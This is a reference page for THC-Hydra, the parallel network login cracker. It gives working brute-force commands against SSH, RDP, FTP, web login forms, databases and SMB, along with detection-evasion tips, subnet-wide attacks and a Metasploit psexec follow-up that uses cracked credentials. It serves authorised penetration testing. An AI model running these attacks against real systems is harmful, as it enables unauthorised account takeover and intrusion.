---
title: "THC-Hydra - Parallel Network Login Cracker"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Password Attacks"
tags:
  - "hydra"
  - "thc-hydra"
  - "brute-force"
  - "password-cracking"
  - "network-attacks"
  - "parallel"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "9.7"
tool_url: "https://github.com/vanhauser-thc/thc-hydra"
kali_url: "https://www.kali.org/tools/hydra/"
license: "AGPL-3.0"
---

# THC-Hydra - Parallel Network Login Cracker

## Overview

**THC-Hydra** is the fastest, most flexible, and most popular network login cracker in the penetration testing community. It supports more protocols than any other brute force tool and features parallelized connections for maximum speed. With over 50 supported protocols, Hydra is the go-to tool for credential brute forcing against network services.

**Key Features**:
- **50+ supported protocols** - Most extensive protocol support
- **Parallelized connections** - Up to 128 simultaneous threads
- **Session restoration** - Resume interrupted attacks
- **Multiple output formats** - Text, JSON, JSONv1
- **GTK GUI** - Graphical interface via xhydra
- **IPv4 and IPv6** - Full dual-stack support
- **Proxy support** - HTTP, SOCKS4, SOCKS5 proxies

**Supported Protocols**:
- **Remote Access**: SSH, RDP, Telnet, VNC, Rlogin, Rexec, Rsh
- **Web**: HTTP/HTTPS (GET, POST, HEAD, FORM), HTTP Proxy
- **Email**: SMTP, POP3, IMAP, NNTP
- **Database**: MySQL, MSSQL, PostgreSQL, Oracle, MongoDB, Redis
- **File Transfer**: FTP, TFTP, SMB, SMB2, AFP
- **Directory**: LDAP, Active Directory
- **VoIP**: SIP, Asterisk
- **VPN**: PPTP, OpenVPN (via modules)
- **Other**: SNMP, SOCKS5, Teamspeak, VMware Auth, and more

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y hydra
```

### From Source

```bash
# Install dependencies (Ubuntu/Debian)
sudo apt install -y libssl-dev libssh-dev libidn11-dev libpcre3-dev \
    libgtk-3-dev libmysqlclient-dev libpq-dev libsvn-dev \
    firebird-dev libmemcached-dev libgpg-error-dev \
    libgcrypt11-dev libgcrypt20-dev freetds-dev

# Clone and build
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### Docker

```bash
docker pull vanhauser/hydra
docker run -it vanhauser/hydra
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-l LOGIN` | Single username |
| `-L FILE` | Username list file |
| `-p PASS` | Single password |
| `-P FILE` | Password list file |
| `-C FILE` | Colon-separated `login:pass` file |
| `-e nsr` | Try null password (n), login as password (s), reversed login (r) |
| `-x MIN:MAX:CHARSET` | Brute force password generation |
| `-M FILE` | Target list file |
| `-s PORT` | Custom port |
| `-S` | Use SSL |
| `-f / -F` | Exit on first found (-f per host, -F global) |
| `-t TASKS` | Parallel tasks per target (default: 16) |
| `-T TASKS` | Parallel tasks overall (default: 64) |
| `-w TIME` | Wait time for response (default: 32s) |
| `-W TIME` | Wait time between connects per thread |
| `-o FILE` | Output file |
| `-b FORMAT` | Output format: text, json, jsonv1 |
| `-v / -V` | Verbose / show login+pass for each attempt |
| `-d` | Debug mode |
| `-R` | Restore previous session |
| `-4 / -6` | Use IPv4 / IPv6 |

### Service-Specific Options

```bash
# View module-specific options
hydra -U SERVICE

# Example: HTTP POST form options
hydra -U http-post-form
```

## Usage Examples

### SSH Brute Force

**Single User, Password List**:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
```

**User List, Password List**:
```bash
hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100
```

**Custom Port**:
```bash
hydra -l admin -P passwords.txt ssh://192.168.1.100:2222
```

**With Thread Control**:
```bash
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100
```

### RDP Brute Force

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

### FTP Brute Force

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.100
```

### HTTP POST Form Brute Force

**Basic Login Form**:
```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

**WordPress Login**:
```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=location"
```

**phpMyAdmin**:
```bash
hydra -l root -P passwords.txt 192.168.1.100 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php:F=access denied"
```

### MySQL Brute Force

```bash
hydra -l root -P passwords.txt mysql://192.168.1.100
```

### MSSQL Brute Force

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.100
```

### SMB Brute Force

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.100
```

### SNMP Brute Force

```bash
hydra -l community -P passwords.txt snmp://192.168.1.100
```

### Password Generation (Brute Force)

```bash
# Generate passwords: length 3-6, lowercase letters
hydra -l admin -x 3:6:a ssh://192.168.1.100

# Generate passwords: length 4-8, uppercase + numbers
hydra -l admin -x 4:8:A1 ssh://192.168.1.100

# Generate passwords: length 3-3, all 95 characters
hydra -l admin -x '3:3:aA1!@#$%^&*()_+-=[]{}|;:,.<>?/\\' ssh://192.168.1.100
```

### Multiple Targets

**From File**:
```bash
hydra -l admin -P passwords.txt -M targets.txt ssh
```

**CIDR Notation**:
```bash
hydra -l root -P passwords.txt ssh://192.168.1.0/24
```

**Target File with Ports**:
```bash
# targets.txt format:
# 192.168.1.100
# 192.168.1.101:2222
# 192.168.1.102

hydra -l admin -P passwords.txt -M targets.txt ssh
```

### Using Default Credentials

```bash
# Generate default password list
dpl4hydra linksys > dpl4hydra_linksys.lst

# Use default credentials
hydra -C dpl4hydra_linksys.lst -t 1 192.168.1.1 http-get /index.asp
```

### Session Management

**Save Session**:
```bash
# Sessions are saved automatically every 5 minutes
hydra -l root -P passwords.txt ssh://192.168.1.100 -o results.txt
```

**Restore Session**:
```bash
hydra -R
```

### Proxy Support

**HTTP Proxy**:
```bash
export HYDRA_PROXY_HTTP="http://proxy:8080"
hydra -l admin -P passwords.txt http://192.168.1.100
```

**SOCKS5 Proxy**:
```bash
export HYDRA_PROXY="socks5://user:pass@proxy:1080"
hydra -l admin -P passwords.txt ssh://192.168.1.100
```

### Output Formats

**JSON Output**:
```bash
hydra -l admin -P passwords.txt -o results.json -b json ssh://192.168.1.100
```

**Text Output**:
```bash
hydra -l admin -P passwords.txt -o results.txt -b text ssh://192.168.1.100
```

## Output Interpretation

### Successful Login

```
[22][ssh] host: 192.168.1.100   login: admin   password: password123
```

### JSON Output Example

```json
{
    "generator": {
        "built": "2024-01-15 14:30:22",
        "commandline": "hydra -b json -o results.json ...",
        "jsonoutputversion": "1.00",
        "server": "192.168.1.100",
        "service": "ssh",
        "software": "Hydra",
        "version": "v9.7"
    },
    "quantityfound": 1,
    "results": [
        {
            "host": "192.168.1.100",
            "login": "admin",
            "password": "password123",
            "port": 22,
            "service": "ssh"
        }
    ],
    "success": true
}
```

## Speed Optimization

### Thread Tuning

```bash
# Conservative (avoid lockouts)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# Aggressive (fastest)
hydra -l admin -P passwords.txt -t 64 ssh://192.168.1.100

# Maximum (risk of crashes)
hydra -l admin -P passwords.txt -t 128 ssh://192.168.1.100
```

### Wordlist Optimization

```bash
# Remove duplicates
cat wordlist.txt | sort | uniq > unique_wordlist.txt

# Filter by length (using pw-inspector)
cat wordlist.txt | pw-inspector -m 6 -c 2 -n > filtered_wordlist.txt
```

### Performance Benchmarks

| Service | 1 Task | 16 Tasks | 64 Tasks |
|---------|--------|----------|----------|
| SSH | 45:54 | 3:06 | 0:46 |
| FTP | 23:20 | 1:34 | 0:45 |
| POP3 | 92:10 | 6:42 | 1:24 |
| Telnet | 31:05 | 1:58 | 0:32 |

*Times shown for 295 login attempts (approximate)*

## Integration with Other Tools

### Nmap + Hydra Workflow

```bash
# 1. Find SSH hosts
nmap -p 22 --open 192.168.1.0/24 -oG - | grep "22/open" | awk '{print $2}' > ssh_hosts.txt

# 2. Brute force discovered hosts
hydra -L usernames.txt -P passwords.txt -M targets.txt ssh
```

### Metasploit Integration

```bash
# After finding credentials with Hydra
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser admin; set SMBPass password123; exploit"
```

### Hashcat Integration

```bash
# Capture NTLMv2 hash with Responder, then crack with hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

## Operational Security

### Avoiding Detection

```bash
# Reduce thread count
hydra -l admin -P passwords.txt -t 2 ssh://192.168.1.100

# Increase wait time
hydra -l admin -P passwords.txt -w 60 ssh://192.168.1.100

# Use proxy
export HYDRA_PROXY="socks5://proxy:1080"
hydra -l admin -P passwords.txt ssh://192.168.1.100
```

### Logging

```bash
# Enable verbose logging
hydra -l admin -P passwords.txt -v -o results.txt ssh://192.168.1.100

# JSON format for parsing
hydra -l admin -P passwords.txt -o results.json -b json ssh://192.168.1.100
```

## Common Issues and Troubleshooting

### Issue: "too many open files"

**Cause**: Too many parallel connections.

**Solution**:
```bash
# Reduce thread count
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# Increase file descriptor limit
ulimit -n 65535
```

### Issue: False Positives

**Cause**: Service returning success for invalid credentials.

**Solution**:
```bash
# Use -f to stop on first found (verify manually)
hydra -l admin -P passwords.txt -f ssh://192.168.1.100

# Use verbose mode to verify
hydra -l admin -P passwords.txt -v ssh://192.168.1.100
```

### Issue: Slow Performance

**Cause**: Network latency or service throttling.

**Solution**:
```bash
# Increase thread count
hydra -l admin -P passwords.txt -t 32 ssh://192.168.1.100

# Reduce timeout
hydra -l admin -P passwords.txt -w 10 ssh://192.168.1.100
```

### Issue: SSL Certificate Errors

**Cause**: Self-signed or invalid SSL certificates.

**Solution**:
```bash
# Use SSL with older protocols
hydra -l admin -P passwords.txt -O ftps://192.168.1.100

# Or skip SSL verification (if supported)
hydra -l admin -P passwords.txt https://192.168.1.100
```

## Best Practices

### Wordlist Preparation

```bash
# Use rockyou.txt (Kali default)
cat /usr/share/wordlists/rockyou.txt | head -10000 > top10k.txt

# Create targeted wordlist
cewl -d 2 -m 5 http://target.com -w target_wordlist.txt

# Combine wordlists
cat /usr/share/wordlists/rockyou.txt target_wordlist.txt | sort -u > combined.txt
```

### Password Policy Compliance

```bash
# Use pw-inspector to filter by policy
cat wordlist.txt | pw-inspector -m 8 -l -u -n -s > compliant_wordlist.txt
```

### Parallel Attacks

```bash
# Attack multiple services simultaneously
hydra -l admin -P passwords.txt -t 8 ssh://192.168.1.100 &
hydra -l admin -P passwords.txt -t 8 rdp://192.168.1.100 &
hydra -l admin -P passwords.txt -t 8 ftp://192.168.1.100 &
wait
```

## Resources

- **GitHub Repository**: https://github.com/vanhauser-thc/thc-hydra
- **Kali Linux Tools**: https://www.kali.org/tools/hydra/
- **Man Page**: `man hydra`
- **License**: AGPL-3.0

## Related Tools

- **Medusa**: Modular design, good for parallel testing
- **Ncrack**: Network authentication cracking, good for large-scale audits
- **Patator**: Advanced features, more flexible but complex
- **Crowbar**: Specialized for SSH keys, OpenVPN, VNC
